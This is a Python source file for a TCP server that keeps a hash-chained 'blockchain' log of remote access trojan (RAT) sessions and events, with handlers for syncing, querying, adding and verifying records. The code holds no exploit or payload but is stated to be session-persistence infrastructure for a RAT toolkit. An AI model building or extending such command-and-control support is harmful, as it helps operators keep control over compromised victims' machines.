#!/usr/bin/env python3
"""
Blockchain Session Persistence Server
Maintains a blockchain of all RAT sessions and events
"""

import socket
import json
import threading
import hashlib
import os
from datetime import datetime
from collections import defaultdict

class Block:
    """Individual block in the blockchain"""
    
    def __init__(self, index, timestamp, session_id, event_type, data, previous_hash):
        self.index = index
        self.timestamp = timestamp
        self.session_id = session_id
        self.event_type = event_type
        self.data = data
        self.previous_hash = previous_hash
        self.hash = self.calculate_hash()
    
    def calculate_hash(self):
        """Calculate SHA-256 hash of block"""
        block_string = json.dumps({
            'index': self.index,
            'timestamp': self.timestamp,
            'session_id': self.session_id,
            'event_type': self.event_type,
            'data': str(self.data),
            'previous_hash': self.previous_hash
        }, sort_keys=True)
        
        return hashlib.sha256(block_string.encode()).hexdigest()
    
    def to_dict(self):
        """Convert block to dictionary"""
        return {
            'index': self.index,
            'timestamp': self.timestamp,
            'session_id': self.session_id,
            'event_type': self.event_type,
            'data': self.data,
            'previous_hash': self.previous_hash,
            'hash': self.hash
        }

class Blockchain:
    """Blockchain for session persistence"""
    
    def __init__(self):
        self.chain = []
        self.session_chains = defaultdict(list)
        self.create_genesis_block()
        self.lock = threading.Lock()
    
    def create_genesis_block(self):
        """Create the first block in the chain"""
        genesis_block = Block(0, datetime.now().isoformat(), "genesis", "init", 
                             {"message": "Genesis Block"}, "0" * 64)
        self.chain.append(genesis_block)
    
    def get_latest_block(self):
        """Get the latest block in the chain"""
        return self.chain[-1]
    
    def add_block(self, session_id, event_type, data):
        """Add a new block to the chain"""
        with self.lock:
            previous_block = self.get_latest_block()
            new_block = Block(
                index=len(self.chain),
                timestamp=datetime.now().isoformat(),
                session_id=session_id,
                event_type=event_type,
                data=data,
                previous_hash=previous_block.hash
            )
            
            self.chain.append(new_block)
            self.session_chains[session_id].append(new_block)
            
            return new_block
    
    def verify_chain(self):
        """Verify the integrity of the entire blockchain"""
        for i in range(1, len(self.chain)):
            current = self.chain[i]
            previous = self.chain[i-1]
            
            # Verify hash
            if current.hash != current.calculate_hash():
                return False, f"Invalid hash at block {i}"
            
            # Verify chain
            if current.previous_hash != previous.hash:
                return False, f"Chain broken at block {i}"
        
        return True, "Blockchain is valid"
    
    def get_session_history(self, session_id):
        """Get all blocks for a specific session"""
        return [block.to_dict() for block in self.session_chains.get(session_id, [])]
    
    def get_all_sessions(self):
        """Get list of all session IDs"""
        return list(self.session_chains.keys())
    
    def get_chain_stats(self):
        """Get blockchain statistics"""
        return {
            'total_blocks': len(self.chain),
            'total_sessions': len(self.session_chains),
            'sessions': list(self.session_chains.keys()),
            'is_valid': self.verify_chain()[0]
        }
    
    def import_chain(self, chain_data):
        """Import blockchain data from client"""
        with self.lock:
            try:
                for block_data in chain_data:
                    # Verify this block doesn't already exist
                    if any(b.hash == block_data.get('hash') for b in self.chain):
                        continue
                    
                    # Add block
                    self.add_block(
                        session_id=block_data['session_id'],
                        event_type=block_data['event_type'],
                        data=block_data['data']
                    )
                
                return True
            except Exception as e:
                print(f"Error importing chain: {e}")
                return False
    
    def save_to_file(self, filename="blockchain.json"):
        """Save blockchain to file"""
        with self.lock:
            try:
                data = {
                    'chain': [block.to_dict() for block in self.chain],
                    'saved_at': datetime.now().isoformat()
                }
                
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                
                return True
            except Exception as e:
                print(f"Error saving blockchain: {e}")
                return False
    
    def load_from_file(self, filename="blockchain.json"):
        """Load blockchain from file"""
        with self.lock:
            try:
                if not os.path.exists(filename):
                    return False
                
                with open(filename, 'r') as f:
                    data = json.load(f)
                
                # Clear existing chain
                self.chain = []
                self.session_chains = defaultdict(list)
                
                # Recreate blocks
                for block_data in data['chain']:
                    block = Block(
                        index=block_data['index'],
                        timestamp=block_data['timestamp'],
                        session_id=block_data['session_id'],
                        event_type=block_data['event_type'],
                        data=block_data['data'],
                        previous_hash=block_data['previous_hash']
                    )
                    
                    self.chain.append(block)
                    if block.session_id != "genesis":
                        self.session_chains[block.session_id].append(block)
                
                return True
            except Exception as e:
                print(f"Error loading blockchain: {e}")
                return False

class BlockchainServer:
    """Server to manage blockchain persistence"""
    
    def __init__(self, host='0.0.0.0', port=5444, blockchain_file='blockchain.json'):
        self.host = host
        self.port = port
        self.blockchain = Blockchain()
        self.blockchain_file = blockchain_file
        self.running = False
        self.server_socket = None
        
        # Load existing blockchain
        if self.blockchain.load_from_file(self.blockchain_file):
            print(f"[+] Loaded blockchain from {self.blockchain_file}")
        else:
            print("[+] Starting with new blockchain")
    
    def start(self):
        """Start the blockchain server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.running = True
            
            print(f"[+] Blockchain server listening on {self.host}:{self.port}")
            
            # Auto-save thread
            threading.Thread(target=self.auto_save, daemon=True).start()
            
            # Accept connections
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    threading.Thread(target=self.handle_client, 
                                   args=(client_socket, address), 
                                   daemon=True).start()
                except Exception as e:
                    if self.running:
                        print(f"[!] Error accepting connection: {e}")
            
        except Exception as e:
            print(f"[!] Failed to start server: {e}")
            return False
        
        return True
    
    def handle_client(self, client_socket, address):
        """Handle client connection"""
        try:
            # Receive data
            data = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b'\n' in chunk:
                    break
            
            if not data:
                return
            
            message = json.loads(data.decode('utf-8'))
            msg_type = message.get('type')
            
            if msg_type == 'blockchain_sync':
                # Client syncing their blockchain
                session_id = message.get('session_id')
                chain_data = message.get('chain', [])
                
                print(f"[+] Syncing blockchain for session {session_id} ({len(chain_data)} blocks)")
                
                if self.blockchain.import_chain(chain_data):
                    response = {'status': 'success', 'message': 'Blockchain synced'}
                else:
                    response = {'status': 'error', 'message': 'Failed to sync blockchain'}
                
                client_socket.send(json.dumps(response).encode() + b'\n')
            
            elif msg_type == 'get_session':
                # Get session history
                session_id = message.get('session_id')
                history = self.blockchain.get_session_history(session_id)
                
                response = {
                    'status': 'success',
                    'session_id': session_id,
                    'history': history
                }
                
                client_socket.send(json.dumps(response).encode() + b'\n')
            
            elif msg_type == 'get_stats':
                # Get blockchain stats
                stats = self.blockchain.get_chain_stats()
                response = {'status': 'success', 'stats': stats}
                
                client_socket.send(json.dumps(response).encode() + b'\n')
            
            elif msg_type == 'add_event':
                # Add new event
                session_id = message.get('session_id')
                event_type = message.get('event_type')
                data = message.get('data', {})
                
                block = self.blockchain.add_block(session_id, event_type, data)
                
                response = {
                    'status': 'success',
                    'block': block.to_dict()
                }
                
                client_socket.send(json.dumps(response).encode() + b'\n')
            
            elif msg_type == 'verify':
                # Verify blockchain integrity
                is_valid, message_text = self.blockchain.verify_chain()
                
                response = {
                    'status': 'success',
                    'is_valid': is_valid,
                    'message': message_text
                }
                
                client_socket.send(json.dumps(response).encode() + b'\n')
            
            else:
                response = {'status': 'error', 'message': 'Unknown message type'}
                client_socket.send(json.dumps(response).encode() + b'\n')
                
        except Exception as e:
            print(f"[!] Error handling client {address}: {e}")
        finally:
            client_socket.close()
    
    def auto_save(self):
        """Auto-save blockchain periodically"""
        while self.running:
            try:
                threading.Event().wait(60)  # Save every 60 seconds
                if self.blockchain.save_to_file(self.blockchain_file):
                    print(f"[+] Blockchain saved to {self.blockchain_file}")
            except Exception as e:
                print(f"[!] Error auto-saving: {e}")
    
    def stop(self):
        """Stop the server"""
        self.running = False
        
        # Final save
        self.blockchain.save_to_file(self.blockchain_file)
        
        if self.server_socket:
            self.server_socket.close()
        
        print("[+] Blockchain server stopped")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Blockchain Session Persistence Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5444, help='Port to listen on')
    parser.add_argument('--file', default='blockchain.json', help='Blockchain storage file')
    
    args = parser.parse_args()
    
    server = BlockchainServer(host=args.host, port=args.port, blockchain_file=args.file)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        server.stop()

if __name__ == "__main__":
    main()

